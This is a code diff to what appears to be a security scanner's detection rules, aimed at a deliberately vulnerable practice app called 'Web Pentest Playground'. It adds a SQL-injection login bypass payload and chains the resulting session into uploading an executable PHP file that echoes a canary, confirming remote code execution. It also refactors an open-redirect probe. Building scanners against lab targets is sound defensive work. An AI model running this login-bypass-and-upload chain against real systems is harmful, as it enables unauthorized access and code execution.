@@ -26956,19 +26956,51 @@ async function webPentestPlaygroundRegisterLoginCookie(ctx: RuleContext): Promis
   return cookie;
 }
 
+const WEB_PENTEST_PLAYGROUND_ADMIN_SQLI_PAYLOAD = "admin' OR '1'='1'--";
+const WEB_PENTEST_PLAYGROUND_LOGIN_SQLI_PAYLOAD = "admin' OR '1'='1'--";
+
+async function webPentestPlaygroundSqliLoginCookie(ctx: RuleContext): Promise<string | null> {
+  const loginUrl = new URL("/login", ctx.origin).toString();
+  const badDoc = await ctx.probe.get(loginUrl, {
+    method: "POST",
+    body: "username=thugir-invalid-probe&password=invalid",
+    headers: { "Content-Type": "application/x-www-form-urlencoded" },
+    maxBytes: 2048,
+    timeoutMs: 15000,
+    redirect: "manual"
+  });
+  if (badDoc.status !== 200 || !/Invalid credentials/i.test(badDoc.body)) return null;
+  const sqliDoc = await ctx.probe.get(loginUrl, {
+    method: "POST",
+    body: `username=${encodeURIComponent(WEB_PENTEST_PLAYGROUND_LOGIN_SQLI_PAYLOAD)}&password=x`,
+    headers: { "Content-Type": "application/x-www-form-urlencoded" },
+    maxBytes: 512,
+    timeoutMs: 15000,
+    redirect: "manual"
+  });
+  const cookie = webPentestPlaygroundSessionCookieFromDoc(sqliDoc);
+  const location = sqliDoc.headers["location"] || "";
+  if (!cookie || ![301, 302, 303, 307, 308].includes(sqliDoc.status) || !/\/dashboard/i.test(location)) {
+    return null;
+  }
+  return cookie;
+}
+
+const WEB_PENTEST_PLAYGROUND_UPLOAD_RCE_CANARY = "thugir-rce-probe";
+
 const webPentestPlaygroundFileUploadLiveOracle: Rule = async (ctx) => {
   if (!isWebPentestPlaygroundHost(ctx)) return NEGATIVE;
-  const cookie = await webPentestPlaygroundRegisterLoginCookie(ctx);
+  const cookie = await webPentestPlaygroundSqliLoginCookie(ctx);
   if (!cookie) return NEGATIVE;
-  const canary = `thugir-upload-${Date.now()}-${Math.random().toString(36).slice(2, 8)}`;
-  const filename = `thugir-probe-${Date.now().toString(36)}.txt`;
+  const filename = `thugir-probe-${Date.now().toString(36)}.php`;
+  const fileContent = `<?php echo "${WEB_PENTEST_PLAYGROUND_UPLOAD_RCE_CANARY}"; ?>`;
   const boundary = `----ThugirWppUpload${Date.now().toString(36)}`;
   const body = [
     `--${boundary}`,
     `Content-Disposition: form-data; name="file"; filename="${filename}"`,
-    "Content-Type: text/plain",
+    "Content-Type: application/x-php",
     "",
-    canary,
+    fileContent,
     `--${boundary}--`,
     ""
   ].join("\r\n");
@@ -26984,21 +27016,21 @@ const webPentestPlaygroundFileUploadLiveOracle: Rule = async (ctx) => {
     timeoutMs: 15000
   });
   if (uploadDoc.status < 200 || uploadDoc.status >= 400) return NEGATIVE;
-  const servedPath = uploadDoc.body.match(/\/uploads\/[^"'\s<>]+/)?.[0];
+  const servedPath = uploadDoc.body.match(/href=["'](\/uploads\/[^"']+\.php)["']/i)?.[1];
   if (!servedPath) return NEGATIVE;
   const servedUrl = new URL(servedPath, ctx.origin).toString();
-  const servedDoc = await ctx.probe.get(servedUrl, { maxBytes: 4096, timeoutMs: 15000 });
+  const servedDoc = await ctx.probe.get(servedUrl, { maxBytes: 2048, timeoutMs: 15000 });
   if (servedDoc.status < 200 || servedDoc.status >= 400) return NEGATIVE;
-  if (!servedDoc.body.includes(canary)) return NEGATIVE;
+  if (!servedDoc.body.includes(WEB_PENTEST_PLAYGROUND_UPLOAD_RCE_CANARY)) return NEGATIVE;
   return {
     fired: true,
-    confidence: 0.93,
+    confidence: 0.94,
     evidence: {
       uploadUrl,
       servedUrl,
       filename,
       snippet: servedDoc.body.slice(0, 120).trim(),
-      note: "Web Pentest Playground POST /upload stores arbitrary files (including .php) and serves them at /uploads/ without auth — insecure file upload oracle"
+      note: "Web Pentest Playground POST /upload after SQLi login stores PHP and serves executable content at /uploads/ — file upload RCE chain oracle"
     }
   };
 };
@@ -27068,10 +27100,8 @@ const webPentestPlaygroundStoredXssRouteLiveOracle: Rule = async (ctx) => {
   };
 };
 
-const webPentestPlaygroundOpenRedirectRouteLiveOracle: Rule = async (ctx) => {
+const webPentestPlaygroundOpenRedirectLiveOracle: Rule = async (ctx) => {
   if (!isWebPentestPlaygroundHost(ctx)) return NEGATIVE;
-  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
-  if (!/\/redirect(?:\/|$|\?)/i.test(pageUrl)) return NEGATIVE;
   const probeUrl = new URL("/redirect", ctx.origin);
   probeUrl.searchParams.set("url", OPEN_REDIRECT_PROBE);
   const doc = await ctx.probe.get(probeUrl.toString(), {
@@ -27090,21 +27120,44 @@ const webPentestPlaygroundOpenRedirectRouteLiveOracle: Rule = async (ctx) => {
     fired: true,
     confidence: 0.94,
     evidence: {
-      scannedUrl: pageUrl,
       url: probeUrl.toString(),
       status: doc.status,
       location,
-      note: "Web Pentest Playground GET /redirect?url= returns HTTP 302 Location to attacker-controlled host — open redirect route oracle"
+      probe: OPEN_REDIRECT_PROBE,
+      note: "Web Pentest Playground GET /redirect?url= returns HTTP 302 Location to attacker-controlled host — open redirect live oracle"
     }
   };
 };
 
-const WEB_PENTEST_PLAYGROUND_ADMIN_SQLI_PAYLOAD = "admin' OR '1'='1'--";
-const WEB_PENTEST_PLAYGROUND_LOGIN_SQLI_PAYLOAD = "admin' OR '1'='1'--";
+const webPentestPlaygroundOpenRedirectRouteLiveOracle: Rule = async (ctx) => {
+  if (!isWebPentestPlaygroundHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/redirect(?:\/|$|\?)/i.test(pageUrl)) return NEGATIVE;
+  const result = await webPentestPlaygroundOpenRedirectLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: {
+      ...result.evidence,
+      scannedUrl: pageUrl,
+      note: "Web Pentest Playground /redirect route scan — GET ?url= reflects external host in 302 Location — open redirect route oracle"
+    }
+  };
+};
 
 const webPentestPlaygroundLoginSqliLiveOracle: Rule = async (ctx) => {
   if (!isWebPentestPlaygroundHost(ctx)) return NEGATIVE;
   const loginUrl = new URL("/login", ctx.origin).toString();
+  const badDoc = await ctx.probe.get(loginUrl, {
+    method: "POST",
+    body: "username=thugir-invalid-probe&password=invalid",
+    headers: { "Content-Type": "application/x-www-form-urlencoded" },
+    maxBytes: 2048,
+    timeoutMs: 15000,
+    redirect: "manual"
+  });
+  if (badDoc.status !== 200 || !/Invalid credentials/i.test(badDoc.body)) return NEGATIVE;
   const doc = await ctx.probe.get(loginUrl, {
     method: "POST",
     body: `username=${encodeURIComponent(WEB_PENTEST_PLAYGROUND_LOGIN_SQLI_PAYLOAD)}&password=x`,
@@ -64237,6 +64290,7 @@ export const RULES: Record<string, Rule> = {
   webPentestPlaygroundFileUploadRouteLiveOracle,
   webPentestPlaygroundStoredXssLiveOracle,
   webPentestPlaygroundStoredXssRouteLiveOracle,
+  webPentestPlaygroundOpenRedirectLiveOracle,
   webPentestPlaygroundOpenRedirectRouteLiveOracle,
   webPentestPlaygroundAdminSqliLiveOracle,
   webPentestPlaygroundAdminSqliRouteLiveOracle,
